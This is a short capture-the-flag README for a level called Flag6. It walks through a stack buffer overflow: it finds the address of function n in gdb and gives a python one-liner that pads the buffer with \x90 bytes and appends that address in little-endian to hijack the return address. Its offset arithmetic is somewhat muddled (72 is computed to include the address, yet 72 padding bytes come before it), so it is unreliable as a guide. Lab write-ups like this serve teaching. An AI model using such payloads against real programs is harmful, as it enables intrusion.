## Flag6 README: Finding Flag6

So the idea is the same because when you write something more long that the size of the buffer you will write to the eip adress. So we can fill the buffer with \x90 (no-op) and then the adress of n. Let's try this.

adress of n =
$1 = {<text variable, no debug info>} 0x8048454 <n>

buffer is size 64 + the size to overflow 4 and then the 4 byte that we need to write to eip the adress in little endian.

64 + 4 + 4 = 72
and the adress = \x54\x84\x04\x08

so
``` bash
python -c 'print("\x90" * 72 + "\x54\x84\x04\x08")'
```
